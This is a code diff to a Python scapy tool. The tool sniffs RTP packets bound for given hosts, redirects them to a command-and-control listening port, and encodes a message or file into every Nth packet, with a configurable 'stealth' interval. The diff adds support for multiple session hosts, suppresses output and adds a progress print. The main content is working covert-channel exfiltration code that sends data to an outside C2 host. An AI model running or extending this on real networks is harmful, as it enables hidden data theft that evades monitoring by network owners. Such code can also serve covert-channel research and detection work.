@@ -1,5 +1,6 @@
 import argparse
 import base64
+import binascii
 import queue
 import time
 import scapy.all as scapy
@@ -27,7 +28,7 @@ def changeIPAndPort(packet, address, port):
 def sendPacket(packet):
     del packet[UDP].chksum
     del packet[IP].chksum
-    sendp(packet)
+    sendp(packet, verbose=0)
 
 
 if __name__ == '__main__':
@@ -37,13 +38,12 @@ if __name__ == '__main__':
     parser.add_argument("-s", "--stealth", help="Number of packet encodings between each RTP transmission")
     parser.add_argument("-d", "--destination_address", help="The destination ipv4 address we send encoded RTP traffic")
     parser.add_argument("-c", "--C2_listening_port", help="The port we forward encoded RTP traffic ro")
-    parser.add_argument("-i", "--host_ip", help="The ipv4 address of a host in the RTP session")
+    parser.add_argument("-i", "--host_ips", help="The ipv4 addresses of hosts in the RTP session")
     args = parser.parse_args()
 
     stealthVal = int(args.stealth)
     destinationAddress = args.destination_address
     listeningPort = int(args.C2_listening_port)
-    hostIP = args.host_ip
 
     print(args)  # Debugging
     if args.filename is not None:
@@ -54,8 +54,11 @@ if __name__ == '__main__':
         transmissionString = args.message
 
     packetQ = queue.Queue()
-
-    asyncSniffer = scapy.AsyncSniffer(filter=f"dst host {hostIP}", prn=lambda x: packetQ.put(x))
+    sessionHostList = args.host_ips.split(",")
+    filterString = f"dst host {sessionHostList} "
+    for h in sessionHostList[1:]:
+        filterString += f"or dst host {h} "
+    asyncSniffer = scapy.AsyncSniffer(filter=filterString, prn=lambda x: packetQ.put(x))
     asyncSniffer.start()
 
     encodedPackets = 0
@@ -63,11 +66,13 @@ if __name__ == '__main__':
     while encodedPackets < len(transmissionString):
         if packetQ.qsize() > 0:
             pkt = packetQ.get()
-            if sentPackets == 0:
-                sendPacket(encodePacket(changeIPAndPort(pkt, destinationAddress, listeningPort), transmissionString[encodedPackets]))
-                encodedPackets += 1
-            else:
-                sendPacket(changeIPAndPort(pkt, destinationAddress, listeningPort))
-            sentPackets = (1 + sentPackets) % stealthVal
+            if pkt.haslayer(IP):
+                if sentPackets == 0:
+                    sendPacket(encodePacket(changeIPAndPort(pkt, destinationAddress, listeningPort), transmissionString[encodedPackets]))
+                    encodedPackets += 1
+                    print(f"Percentage complete: {encodedPackets / len(transmissionString)}%")
+                else:
+                    sendPacket(changeIPAndPort(pkt, destinationAddress, listeningPort))
+                sentPackets = (1 + sentPackets) % stealthVal
 
     asyncSniffer.stop()
